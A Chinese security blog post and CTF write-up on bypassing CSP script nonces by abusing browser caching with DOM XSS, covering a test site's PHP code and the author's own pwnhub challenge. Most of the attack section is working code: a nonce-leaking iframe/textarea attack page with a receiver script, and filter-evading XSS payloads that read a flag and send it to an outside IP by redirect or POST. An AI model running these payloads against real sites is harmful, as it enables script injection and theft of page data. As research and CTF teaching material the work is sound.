---
title: 通过浏览器缓存来bypass CSP script nonce
date: 2017-05-16 17:45:50
tags:
- csp
- pwnhub
---



原文被我发在freebuff上
[http://www.freebuf.com/articles/web/133455.html](http://www.freebuf.com/articles/web/133455.html)

最近看了去年google团队写的文章CSP Is Dead, Long Live CSP!，对csp有了新的认识，在文章中，google团队提出了nonce-{random}的csp实现方式，而事实上，在去年的圣诞节，Sebastian 演示了这种csp实现方式的攻击方式，也就是利用浏览器缓存来攻击，事实上，我很早就看到了这篇文章，但是当时并没有看懂，惭愧了，现在来详细分析下。

<!--more-->

# 漏洞分析 #


原文
[http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html](http://sirdarckcat.blogspot.jp/2016/12/how-to-bypass-csp-nonces-with-dom-xss.html)

国内的翻译（只有翻译）
[http://paper.seebug.org/166/](http://paper.seebug.org/166/)

首先我需要个demo

首先是实现了nonce script的站，然后包含了因为是利用了浏览器缓存，所以我们不能对页面发起请求，因为发起请求之后，后台就会刷新页面并刷新nonce的字符串，符合条件的只有3种。

1、持久型 DOM XSS，当攻击者可以强制将页面跳转至易受攻击的页面，并且 payload 不包括在缓存的响应中（需要提取）。

2、包含第三方 HTML 代码的 DOM XSS 漏洞（例如，fetch(location.pathName).then(r=>r.text()).then(t=>body.innerHTML=t);）

3、XSS payload 存在于 location.hash 中的 DOM XSS 漏洞（例如 https://victim/xss#!foo?payload=）

这里首先我们需要一个开启了nonce script规则的站，并加入一个xss点

```
/csp/test.php

<?php
function random_string( $length = 8 ) { 
  $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'; 
  $password = ''; 
  for($i = 0; $i < $length; $i++)
  { 
    $password .= $chars[ mt_rand(0, strlen($chars) - 1) ]; 
  } 
  return $password; 
} 

$random = random_string(12);

header('Content-Security-Policy: default-src \'none\'; script-src \'nonce-'.$random .'\';');
header('Cache-Control: max-age=99999999');

?>

<script nonce='<?php echo $random;?>'>document.write('URL ' + unescape(location.href))</script><script nonce='<?php echo $random;?>'>console.log('another nonced script')</script>

```

然后我们需要利用iframe引入这个页面，并对其发起请求获取页面内容，这里我们通过向其中注入一个`<textarea>`标签来吃掉后面的script标签，这样就可以获取内容。

```
attack.php


<iframe id="frame" src="http://127.0.0.1/ctest/csp/test.php#<form method='post' action='http://127.0.0.1/ctest/nonce_receiver.php'><input type='submit' value='test!'><textarea name='nonce'>"></iframe>

<script>
  function getNonce() { 
    var xhr = new XMLHttpRequest();
    xhr.open("GET", "nonce_receiver.php", false);
    xhr.send();
    return xhr.responseText;
  }
 
  setTimeout(pollNonce, 1000);
  function pollNonce() {
    var nonce = getNonce();

    if (nonce == "") {
      setTimeout(pollNonce, 1000);
    } else {
      attack(nonce);
    }
  }

  function attack(nonce) {
    var iframe = document.createElement("iframe");
    var url = "http://127.0.0.1/ctest/csp/test.php#"
    var payload = "<script nonce='" + nonce + "'>alert(document.domain)</scr" + "ipt>"
    var validationPayload = "<script>alert('If you see this alert, CSP is not active')</scr" + "ipt>"
    iframe.src = url + payload + validationPayload;
    document.body.appendChild(iframe);
  }

</script>
```

然后我们需要一个页面去获取nonce字符串，为了反复获得，这里需要开启session。
```
<?php
session_start();

if(!empty($_POST)){
	$message = $_POST['nonce'];
	preg_match('/(nonce=\')\w+\'/', $message, $matches);
	$nonce_number = substr($matches[0], 7, -1);
	$_SESSION['nonce'] = $nonce_number;
	echo $nonce_number;

}else if(!empty($_SESSION['nonce'])){
	echo $_SESSION['nonce'];
}
?>
```

 一切就绪了，唯一的问题就是在nonce script上，由于csp开启的问题，我们没办法自动实现自动提交，也就是攻击者必须要使按钮被点击，才能实现一次攻击。
 
 ![image_1bchpbi9rkcc1rj812s4mt1jo49.png-116.6kB][1]


# nonce绕过实例-pwnhub绝对防御 #

为了研究整个漏洞的限制性，我专门写了一个pwnhub的题目。题目环境大概是这样的。

前台是个聊天版，可以发给任何人，有简单的xss过滤，但是可以随便绕过

![image_1bei38vv318ft1nanss23vpf4e9.png-25.3kB][2]

在admin的聊天版里可以找到后台的信息，通过构造任意xss获得后台地址。

```
Wow, good guys,maybe you want /adminshigesha233e3333/#admin
```

打开看一眼发现敏感信息

![image_1bei3c425lcq9j519p24vmg1hm.png-18.6kB][3]

右键看源码是这样的

![image_1bei3dvii1ut4n0p6l3pjgbpu13.png-22.9kB][4]

存在dom xss，看看返回头还可以发现更多信息。

![image_1bei3ivl41icf9u011vj1sp7o0f1g.png-24.9kB][5]

服务端不但开启了最新版的nonce csp，而且还开启了浏览器缓存

这就让我们有了可乘之机，就如同上面提到的一样，如果我们仅修改location.hash，浏览器不会请求服务器，那么nonce string就不会更换。

那么思路就很清楚了，我们可以在主站构造xss，先开iframe请求admin目录的，获取到nonce值后，再新建一个iframe，添加带有nonce字符串的iframe窗口，执行任意xss

```
<iframe src="/adminshigesha233e3333#a"></iframe>
<scrscriptipt>
window.oonnload=setTimeout(functioonn(){
 var f=document.getElementsByTagName("iframe")[0];
 var
n=f.coonntentWindow.document.getElementsByTagName("scrscriptipt")[0].
getAttribute("noonnce");
 coonnsole.log(n);
 var f2=document.createElement("iframe");
 var u="/adminshigesha233e3333#";
 var p="<scr"+"ipt noonnce='"+n+"'
src='../static/js/jquery.min.js'></scr"+"ipt><scri"+"pt
noonnce='"+n+"'>$.get('/adminshigesha233e3333/flag.php',functioonn(da
ta){top.locatioonn.href='//x.x.x.x/?c='+escape(data)});</scr"+"ipt>";
 f2.src=u+p;
 document.body.appendChild(f2);
},1000);
</scrscriptipt>

```

但是让我回过头来总结下上面的利用条件：

1、目标站开启了缓存机制。

2、目标站同源下存在未被csp保护的存在xss的站点。

但事实上，我们本可以用更简单的方式获得目标站的flag，比如构造一个iframe引入flag.php，然后读iframe内容，在同源的情况下是允许的。

payload如下
```
<iframe src="./adminshigesha233e3333/#<iframe src='./flag.php' id=xss>" id=xss2>

<scscriptript>
functioonn x(){
 var inner =
document.getElementById("xss2").coonntentDocument.getElementById("xss").coonntentDocum
ent.body.innerHTML;
var xml = new XMLHttpRequest();
xml.open('POST', 'http://52.80.63.91/api/addmessage.php', true);
xml.setRequestHeader("Coonntent-type","applicatioonn/x-www-form-urlencoded");
xml.send('to=sss&message='+escape(inner));
};
 setTimeout("x()",2000);
 </scscriptript>
```

那么如果admin站点和xss站点非同源呢？由于同源策略的影响，你不能从父窗口获取子窗口的内容，那么就只能通过点击劫持的方式，来发送请求，payload如前面漏洞分析时讲到的。


  [1]: http://static.zybuluo.com/LoRexxar/k8qla98d1zqzmp7jd9p2hth5/image_1bchpbi9rkcc1rj812s4mt1jo49.png
  [2]: http://static.zybuluo.com/LoRexxar/h9y56mw4eqx0w16a9ju4h0i7/image_1bei38vv318ft1nanss23vpf4e9.png
  [3]: http://static.zybuluo.com/LoRexxar/x665kblc6mz1fisgs3ipczcz/image_1bei3c425lcq9j519p24vmg1hm.png
  [4]: http://static.zybuluo.com/LoRexxar/sdexy7qywxsqttqsewa8bkca/image_1bei3dvii1ut4n0p6l3pjgbpu13.png
  [5]: http://static.zybuluo.com/LoRexxar/e6uhrjtjw6ftcnbq0c3t9dd9/image_1bei3ivl41icf9u011vj1sp7o0f1g.png